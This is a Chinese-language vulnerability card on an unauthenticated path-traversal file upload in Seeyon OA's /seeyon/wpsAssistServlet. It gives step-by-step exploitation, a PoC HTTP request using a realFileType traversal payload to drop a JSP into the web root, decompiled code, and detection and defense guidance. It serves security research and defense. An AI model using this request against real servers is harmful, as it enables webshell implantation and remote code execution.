---
id: web-java-component-seeyon-wpsassistservlet-realfiletype-upload-traversal
title: 致远 OA wpsAssistServlet 未授权任意文件上传：flag=save 进入 oaSaveFile，realFileType 拼接路径穿越落 jsp
type: scenario
domain: web
path: web/java/component
technique: seeyon-wpsassistservlet-realfiletype-path-traversal-upload
aliases:
- 致远 OA wpsAssistServlet 文件上传
- seeyon wpsAssistServlet 任意文件上传
- realFileType 穿越
- WPSOfficeServlet saveFile
- oaSaveFile
- 致远 OA webshell
tags:
- seeyon
- oa
- file-upload
- path-traversal
- auth-bypass
- webshell
- java
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V625
  verified_at: '2026-11-12T22:16:45+08:00'
  notes: 已对照原文与15张图核对：图10 filter-mapping /wpsAssistServlet、图11 doPost按flag分派(save/open/template/attachment/download/saveother/hualian/getImage)且flag=save→saveFile、图12 saveFile取fileId→canGetLock→oaSaveFile、图13 canGetLock(locksMap.get(fileId)!=null则false，否则put并true——卡片写『不存在才加锁返回true』正确，纠正了原文正文『locksMap中存在』的文字笔误)、图14 oaSaveFile取realFileType经SUPPORT_SUFFIX检查后拼tempFolder+separator+fileId+realFileType→saveFileToPath、图15实测POST flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/xxx.jsp&fileId=2返回200 JSON，均与卡片一致。SUPPORT_SUFFIX具体常量截图未展开，卡片已如实注明需按目标版本确认并保持confidence medium。已把触发条件中无原文依据的『厂商已发布修复』改为中性表述。版本：原文未标注受影响版本，affected_versions不设。dedup：与xrdcontroller/officeservlet/aiedoc/jsf-transferdata等同类文件sink卡入口与代码路径均不同，非同链；dup-scan.json无涉及pair。保留。
---

## 一句话结论

致远 OA 的 `/seeyon/wpsAssistServlet` 不在 `ServletAuthenticator` 白名单、又经 `CTPSecurityFilter` 进入无校验的 defaultAuthenticator，可未登录访问；其 `doPost` 按 `flag` 参数分派业务，`flag=save` 时经 `canGetLock(fileId)`（首次任意 fileId 即可加锁）进入 `oaSaveFile`，其中 `realFileType` 参数被直接拼进临时文件路径（`tempFolder + fileId + realFileType`），攻击者用 `../../../../ApacheJetspeed/webapps/ROOT/xxx.jsp` 这类值把 jsp 写到 Web 可执行目录，实现未授权任意文件上传与代码执行。

## 原理

- **未授权入口**：web.xml 中 `SecurityFilter` 明确映射 `/wpsAssistServlet`，但该 servlet 不在 `ServletAuthenticator.servlets` 硬编码列表中，`.psml` 规则也不覆盖，最终走 `defaultAuthenticator`（validate 恒 true），因此无需登录即可调用。
- **flag 分派**：`WpsAssistServlet.doPost` 读取 `flag` 参数：`save` → `wpsOfficeApi.saveFile(...)`；另有 `open`/`template`/`attachment`/`download`/`saveother`/`hualian`/`getImage` 等分支，均可未授权触达，`save` 是文件落盘分支。
- **锁校验不是阻碍**：`saveFile` 先 `MapUtils.getLong(param,"fileId")`，再 `canGetLock(fileId)`：若 `locksMap` 中不存在该 fileId，则 put 并返回 true（首次加锁成功）；已存在才返回 false。攻击者用任意新 fileId 即可通过。
- **穿越点**：`oaSaveFile` 从参数取 `realFileType`，做 `SUPPORT_SUFFIX` 包含检查后，直接拼成 `tempFileIdPathSuffix = SystemEnvironment.getSystemTempFolder() + File.separator + fileId + realFileType`，再 `saveFileToPath` 写入。`realFileType` 未过滤 `../`，可穿越到 `ApacheJetspeed/webapps/ROOT/` 等 Web 目录；文件名以攻击者给定内容落盘，jsp 即可被容器解析执行。
- **为什么 jsp 能过类型检查**：原文截图中 `SUPPORT_SUFFIX` 检查的具体常量未展开，但实际请求（`realFileType=../../../../ApacheJetspeed/webapps/ROOT/xxx.jsp`）返回 200 且文件落地，说明该检查在该版本可被带路径的值绕过或以子串方式判断；复现时需按目标版本确认白名单值。
- **影响**：未授权上传 jsp 到 Web 目录 → 直接 webshell/命令执行；也可覆盖已有文件破坏配置。

## 触发条件

- 致远 OA 版本包含 `/seeyon/wpsAssistServlet` 且走 defaultAuthenticator（见关联鉴权卡）。
- 服务端 `ApacheJetspeed/webapps/` 目录对运行用户可写（默认部署结构满足）。
- 目标未部署对应防护（网关拦截或补丁，修复状态以目标版本实际情况为准）。

## 利用步骤

1. 未登录访问 `/seeyon/wpsAssistServlet?flag=save` 或发送最小请求，确认接口可达（返回业务 JSON 而非登录跳转）。
2. 选定新 fileId（任意数字，确保 locksMap 未占用）。
3. 构造 POST：query 带 `flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/<name>.jsp&fileId=<id>`，body 为 jsp 内容（表单/原始字节按接口实现发送）。
4. 上传成功后按穿越后的路径访问 `/<name>.jsp` 验证执行；如需更隐蔽可写到已有目录的合法后缀配合解析。
5. 若第一次 fileId 已被加锁（返回失败），换一个 fileId 重试。

## PoC

原文实测请求（路径/参数示意，不执行）：

```http
POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/<file>.jsp&fileId=2 HTTP/1.1
Host: <target>
Content-Length: 215

<上传内容>
```

```text
响应：HTTP/1.1 200 OK, Content-Type: application/json;charset=UTF-8
```

关键代码路径（反编译要点）：

```java
// WpsAssistServlet.doPost
if (flag.equalsIgnoreCase("save")) this.wpsOfficeApi.saveFile(request, response);

// saveFile -> canGetLock(fileId)、oaSaveFile(request, param)
// oaSaveFile:
String realFileType = MapUtils.getString(param, "realFileType", "");
if (!SUPPORT_SUFFIX.contains(realFileType.toLowerCase())) throw new IllegalArgumentException(...);
String path = SystemEnvironment.getSystemTempFolder() + File.separator + fileId + realFileType;
this.saveFileToPath(request, path);   // realFileType 含 ../ 时穿越
```

## 变体与关联

- 关联：[[web-java-component-seeyon-ctpsecurityfilter-servlet-auth-gap]]（未授权的根因）、[[web-java-component-seeyon-xrdcontroller-checkissign-file-copy-traversal]]（同类文件路径处理缺陷的另一入口）、[[web-java-component-seeyon-ofd-unzip-zipslip-webshell-write]]（另一条写 webshell 的链）。
- 变体：`flag` 的其他分支（open/download/saveother 等）可能对应文件读取/写出，可同样审计；`newPdfFileId` 参数会覆盖 fileId，影响落盘文件名/路径。
- 边界：不同小版本 `SUPPORT_SUFFIX` 与 `oaSaveFile` 实现可能不同，需按目标版本验证；只做授权测试。

## 检测与防御

- 厂商补丁：升级致远 OA 到修复版本；无法升级时在网关/WAF 拦截 `/seeyon/wpsAssistServlet` 的外部访问。
- 权限加固：给该 servlet 增加独立鉴权；把 `ApacheJetspeed/webapps` 设为不可写或禁止执行上传目录中的脚本（如仅允许静态资源）。
- 检测：访问日志中出现 `/wpsAssistServlet` 且带 `flag=save`、`realFileType` 含 `../`、`fileId=` 的请求；Web 目录新增 jsp 文件与异常进程创建告警。
- 应急：排查 webapps 目录新增/修改文件，检查 webshell 与后续横向。
